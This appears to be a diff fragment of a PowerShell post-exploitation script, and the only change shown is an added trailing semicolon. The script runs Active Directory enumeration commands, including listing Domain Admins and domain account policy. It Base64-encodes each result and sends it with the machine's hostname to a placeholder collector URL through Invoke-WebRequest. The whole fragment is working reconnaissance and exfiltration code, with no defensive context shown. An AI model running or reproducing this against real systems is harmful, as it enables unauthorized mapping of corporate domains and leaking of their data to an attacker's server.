@@ -46,4 +46,4 @@ DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain)
 DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
 };
 $URL='http://<HOST>:<PORT>/?';
-foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;}
+foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;};
